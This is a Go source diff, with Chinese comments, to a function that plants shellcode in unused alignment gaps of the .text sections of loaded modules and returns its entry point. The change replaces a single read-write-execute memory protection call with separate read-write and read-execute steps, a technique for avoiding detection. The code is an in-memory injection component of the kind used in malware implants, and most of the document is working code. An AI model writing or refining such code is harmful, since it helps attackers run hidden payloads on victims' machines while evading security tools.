@@ -18,7 +18,8 @@ import (
 // 实现：遍历当前进程已加载模块（K32EnumProcessModules），对每个模块读
 // PE 头找 .text 节，计算节内未初始化/对齐空洞；空洞 ≥ payload 大小则驻留。
 //
-// ⚠️ 实验性：写入只读节需临时改页保护（VirtualProtect），完成后还原；
+// ⚠️ 实验性：空洞驻留分两步改页保护 —— 先 VirtualProtect 成 RW 写入，
+// 写完再改成 RX 执行（不请求 RWX，也不还原成可能缺失执行位的旧保护）；
 // 空洞内已有代码会被覆盖（选用 .text 尾部的对齐空洞，不影响原功能）。
 
 // carveModule 在已加载模块的 .text 空洞驻留 shellcode 并返回入口地址。
@@ -26,7 +27,6 @@ func carveModule(shellcode []byte) (uintptr, error) {
 	procEnumModules := resolveAPI("psapi.dll", "K32EnumProcessModules")
 	procGetModuleBaseName := resolveAPI("psapi.dll", "K32GetModuleBaseNameW")
 	procGetModuleInfo := resolveAPI("psapi.dll", "K32GetModuleInformation")
-	procVirtualProtect := resolveAPI("kernel32.dll", "VirtualProtect")
 	procFlushICache := resolveAPI("kernel32.dll", "FlushInstructionCache")
 	procCloseHandle := resolveAPI("kernel32.dll", "CloseHandle")
 
@@ -70,9 +70,8 @@ func carveModule(shellcode []byte) (uintptr, error) {
 		}
 		dst := mi.baseOfDll + off
 
-		// 临时改页保护为可写（保留执行位）
-		var oldProt uint32
-		if _, _, _ = procVirtualProtect.Call(dst, uintptr(size), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProt))); r1 == 0 {
+		// 写入阶段：先把空洞页改成 RW（可写**不可执行**）——绝不请求 RWX。
+		if err := protectRW(dst, uintptr(size)); err != nil {
 			continue
 		}
 		// 拷贝 shellcode
@@ -80,9 +79,11 @@ func carveModule(shellcode []byte) (uintptr, error) {
 		copy(dstPtr[:size], shellcode)
 		// 刷新指令缓存
 		procFlushICache.Call(^uintptr(0), dst, uintptr(size))
-		// 还原保护（若原保护非 RWX）
-		if oldProt != windows.PAGE_EXECUTE_READWRITE {
-			procVirtualProtect.Call(dst, uintptr(size), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+		// 执行阶段：改回 RX（可执行不可写）。.text 空洞最终必须可执行，因此固定给
+		// PAGE_EXECUTE_READ，而不是还原可能不含执行位的旧保护（旧保护若本身已是
+		// PAGE_EXECUTE_READ/RX，则此次调用等价于无变化）。
+		if err := protectRX(dst, uintptr(size)); err != nil {
+			continue
 		}
 		_ = procCloseHandle
 		return dst, nil
